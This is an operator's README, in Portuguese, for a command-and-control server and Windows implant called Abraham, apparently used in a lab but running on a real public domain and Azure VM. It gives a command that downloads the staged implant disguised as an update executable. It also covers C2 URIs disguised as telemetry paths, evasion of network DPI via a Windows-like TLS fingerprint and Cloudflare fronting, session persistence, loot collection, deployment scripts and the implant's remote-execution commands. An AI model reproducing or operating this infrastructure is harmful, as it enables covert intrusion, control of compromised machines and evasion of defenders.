# avln — Abraham C2 host (nora.systems)

O endpoint público do laboratório real. Mantenha este arquivo como a
fonte da verdade operacional do host.

## Endpoint

- **`https://avln.nora.systems` — porta 443** (implante: `--server
  avln.nora.systems:443`, ou já embutido no build atual)
- URIs do profile malleable (POST do protocolo):
  `/api/v1/telemetry`, `/cdn/update`, `/static/config`
- **Stage por GET**: um GET em qualquer URI do profile devolve o
  payload staged (o implant compilado — build atual: configuração
  embutida, ZERO argumentos). Exemplo:
  `Invoke-WebRequest https://avln.nora.systems/cdn/update -OutFile svc-upd.exe`
- Fora do profile: 404 como um web server comum.

## Identidade / pins

- **Server Ed25519 public key (hex)** — o `--key` do implante:
  `acd94f64d078e1cde63dcb422f3d17bf16aa5f06243860c43ad1e0208f8c14d5`
- Cert TLS da ORIGEM (Let's Encrypt, sha256 DER):
  `08ab22d5fcf101302b1de584501039f07d2887396bfd3ad4ea05984ecd63fc51`
  — só é visto pelo cliente em modo DNS-only; com o proxy Cloudflare
  ativo o cliente vê o cert da edge (Universal SSL), então o build
  atual roda SEM `--tls-pin`: a autenticidade de ponta a ponta é o
  handshake Ed25519 interno (docs/protocol.md §4). Se a edge rotacionar
  o cert, nada quebra.
- TLS do implante: **Schannel (native-tls)**, não rustls. A rede do
  laboratório (Fortinet DPI) segura handshakes cujo ClientHello não é
  de browser/OS (rustls: sem GREASE, fingerprint própria) — medido:
  rustls levou ~16 min para atravessar; schannel conecta em segundos.
  Schannel também é o fingerprint do tráfego Windows normal.

## Comportamento atrás do proxy Cloudflare (validado 2026-09-12)

- A edge fecha conexões origin/client de tempos em tempos e rejeita
  intermitentemente POSTs novos com 400 (~1/3, sem chegar à origem).
  O implante trata isso com backoff curto — uma reconexão typical
  resolve em um ciclo de 5s.
- **Origin pooling resolvido por demux**: a edge reusa conexões origin
  entre clientes, então requests de transportes diferentes chegam
  INTERCALADOS na mesma conexão TCP do server. Todo POST do implante
  carrega `X-Session: <token>` (e o ClientHello leva `X-Handshake: 1`);
  o server roteia cada request pela sessão, não pela conexão. Um frame
  que não decripta custa o request (400) — nunca a conexão ou a sessão
  (protocol.md §5.1). Builds antigos (sem header) seguem funcionando
  pelo caminho legado 1-conexão-1-sessão.
- **Session resume**: cada processo implante gera um `session_token`
  (u64) na primeira execução e o reapresenta a cada re-register. Queda
  de transporte não cria sessão nova — o teamserver reanexa na MESMA
  sessão (fila de tasks e resultados preservados; journal:
  `[~] session N resumed from <edge-ip>`). Cada processo novo = token
  novo = sessão nova (comportamento correto).
- **Persistência entre restarts**: o server salva o registry de sessões
  (ids, tokens, resultados, contadores) em `state/sessions.json`. Um
  restart (redeploy!) não órfã histórico: o beacon re-registra com o
  mesmo token, resume na MESMA sessão e drena tasks que foram
  enfileiradas enquanto ele estava offline.
- Timeout de I/O: cada troca HTTP do implante é limitada a 30s —
  conexão meia-morta (edge dropa silenciosamente) vira erro ->
  reconexão + resume, nunca um beacon mudo.
- Resultados maiores que ~48 KB são divididos: preview inline no
  resultado da task + payload completo entregue como loot
  (`loot/session-N/task-M.bin` no teamserver).

## Infra

- Azure `rg-avln` / `vm-avln` (Central US, Standard_B2ats_v2,
  Ubuntu 24.04), IP público `20.9.60.148` (oculto pelo DNS proxied).
- NSG: 443 aberto; SSH 22 E 80 restritos ao egress do laboratório
  (a rede local bloqueia 22 outbound e o DPI reseta SSH em porta 80 —
  admin é por `az vm run-command`).
- Serviço: `avln-server.service` (systemd) rodando
  `/opt/avln/target/release/abraham-server --listen 0.0.0.0:443
  --mgmt 127.0.0.1:9200 --tls-cert/-key /etc/letsencrypt/live/
  avln.nora.systems/... --stage-file /opt/avln/run/stage.bin`,
  working dir `/opt/avln/run` (server.key/pub e `state/sessions.json`
  vivem lá).
- Fonte em `/opt/avln` (build na própria VM; `push.sh` sincroniza o
  workspace inteiro e builda `-p abraham-server`).

## Deploy (one command)

```
deploy/avln/push.sh [--skip-source] [--skip-stage]
```

Do zero: builda o implante operacional (config de
  `deploy/avln/embed.json` embutida), sincroniza a árvore de fonte,
  builda o server NA VM, troca o stage, restarta o serviço e valida
  (mgmt `sessions` + hash do stage servido publicamente = hash local).
  `--skip-source` só re-stageia; `--skip-stage` só rebuilda o server.
  Cada passo é um Azure Run Command (upload em chunks gzip+base64 via
  `upload_chunked.py`). Como o server persiste sessões, o restart do
  deploy não derruba history: os beacons resumem sozinhos.

## Operar (mgmt)

Sem SSH utilizável, o canal é o Run Command. Wrapper pronto (aceita
qualquer request JSON):

```
"C:/Program Files/Microsoft SDKs/Azure/CLI2/python.exe" deploy/avln/mgmt.py '{"cmd":"sessions"}'
```

**A porta 9200 fala JSON-lines em TCP cru (uma linha JSON por request,
uma linha de resposta) — não é HTTP.** O RunShellScript executa via dash
(sem `/dev/tcp`), então o `mgmt.py` pipeia via python3 na VM com payload
base64. O comando manual equivalente:

```
az vm run-command invoke -g rg-avln -n vm-avln --command-id RunShellScript \
  --scripts "python3 -c \"import socket,base64,sys; s=socket.create_connection(('127.0.0.1',9200),3); s.sendall(base64.b64decode(sys.argv[1])+b'\n'); s.settimeout(5); print(s.recv(65536).decode().strip())\" $(echo -n '{\"cmd\":\"sessions\"}' | base64 -w0)"
```

Comandos: `sessions`, `results` (com `session`), `shell`, `module`,
`driver`, `exec`, `execasm`, `powershell`, `runpe`, `upload`...

Logs: `journalctl -u avln-server -n 50 --no-pager` pelo mesmo canal.

## Manutenção / limites

- Cert Let's Encrypt: 90 dias; o token DNS-01 foi apagado da VM após a
  emissão — renovar significa reescrever o creds e rodar `certbot renew`
  (ou reemitir). Falha de renew não derruba o pin interno (o implante
  não pina a edge), só quebra o Full(strict) da origem.
- O stage é PÚBLICO: qualquer um que descubra a URL baixa o binário.
  É o trade clássico do staging; a URL semi-secreta é a mitigação
  aceita (anotada como IOC do próprio laboratório).
- Custos: B2ats_v2 (~US$0,02/h) — desligar com
  `az vm deallocate -g rg-avln -n vm-avln` quando não estiver em uso.
